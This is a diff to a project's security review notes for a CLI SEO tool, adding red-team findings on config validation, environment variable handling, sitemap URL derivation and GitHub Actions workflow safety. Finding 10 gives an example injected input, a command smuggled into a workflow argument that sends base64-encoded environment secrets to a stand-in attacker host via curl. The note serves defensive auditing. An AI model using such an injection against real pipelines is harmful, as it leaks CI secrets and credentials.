@@ -67,6 +67,40 @@ The CI/CD pipelines and integration config exist, but when bmtgradweek's CI runs
 **Risk:** `http://localhost`, `http://127.0.0.1`, `http://169.254.169.254` all pass validation. In CI, this could expose internal services. However, this is a CLI tool (not a server-side proxy), and the attacker would need to control the CLI flags — which means they already have shell access. Accepted risk for a CLI tool.
 **Fix:** Documented as known limitation. No code change needed.
 
+## Red Team Critique — 2026-02-26 (Round 3: Pre-publish gate)
+
+### Finding 7: Zod `.url()` on `bing.siteUrl` defeats `${VAR:-}` pattern (HIGH)
+**Location:** `src/config/schema.ts:21` + `src/config/loader.ts:119`
+**Risk:** A CI config with `"siteUrl": "${BING_SITE_URL:-}"` crashes during Zod parse because `.url()` rejects empty strings. The post-validation stripping code never runs. `google.siteUrl` uses plain `.string()` and works fine — inconsistency. Any CI pipeline using an optional bing block will crash.
+**Fix:** Change `bing.siteUrl` from `z.string().url()` to `z.string()` for consistency with `google.siteUrl`. Add the `siteUrl` check to the bing stripping logic. Add test for empty bing config.
+
+### Finding 8: Whitespace-only env vars bypass API block stripping (MEDIUM)
+**Location:** `src/config/loader.ts:113-124`
+**Risk:** `!key` is truthy for `" "` (whitespace). A whitespace-only env var (common .env typo) survives stripping and causes confusing auth errors with no clear signal.
+**Fix:** Use `.trim()` on string values in stripping checks.
+
+### Finding 9: `--base-url` with query/fragment breaks derived sitemap (LOW)
+**Location:** `src/commands/audit.ts:237`
+**Risk:** String concatenation to derive sitemap URL doesn't account for query strings or fragments in the base URL. `https://example.com?q=1` → `https://example.com?q=1/sitemap.xml`. Unlikely user error, confusing silent failure.
+**Fix:** Accepted risk — unlikely edge case for a CLI tool. Could fix with `new URL('/sitemap.xml', baseUrl)` if it becomes a problem.
+
+## Red Team Critique — 2026-02-26 (Round 4: Workflow security)
+
+### Finding 10: Shell injection in `seo-post-deploy.yml` via workflow inputs (HIGH)
+**Location:** `.github/workflows/seo-post-deploy.yml:71-73`
+**Risk:** `${{ inputs.commands }}` and `${{ inputs.config-path }}` are directly interpolated into the shell `run` block. A calling workflow could pass `commands: "index; curl evil.com/exfil?$(env|base64)"` to exfiltrate secrets. This is the textbook GitHub Actions script injection pattern. Ironic: the secrets step (lines 46-67) correctly uses `env:` to avoid this, but the run step doesn't.
+**Fix:** Pass inputs as environment variables: `env: COMMANDS: ${{ inputs.commands }}` and reference as `$COMMANDS` / `$CONFIG_PATH` in the script.
+
+### Finding 11: `release.yml` tag pattern `v*` too broad + no version check (MEDIUM)
+**Location:** `.github/workflows/release.yml:6`
+**Risk:** Tag filter `v*` matches `v-test`, `vomit`, etc. Accidental tag push publishes to npm. No validation that tag matches `package.json` version — pushing `v2.0.0` when package.json says `0.1.0` publishes `0.1.0` under a `v2.0.0` release.
+**Fix:** Tighten tag pattern and add version-tag check step. Deferred — operational risk, not a code vulnerability.
+
+### Finding 12: `.env.local` location assumption in workflow (LOW)
+**Location:** `.github/workflows/seo-post-deploy.yml:49` vs `src/config/loader.ts:81`
+**Risk:** Workflow writes `.env.local` to workspace root. `loadConfig` reads `.env.local` from `dirname(configPath)`. If `config-path` is in a subdirectory, secrets are silently invisible. All commands skip with no error.
+**Fix:** Accepted constraint — document that config file must be at workspace root for the reusable workflow.
+
 ## Deployment Checklist
 
 - [x] **1. Document `--base-url` and `--sitemap` flags in audit help text** — CLI `audit --help` doesn't show the new flags. Add them to the help output in `src/cli.ts`.
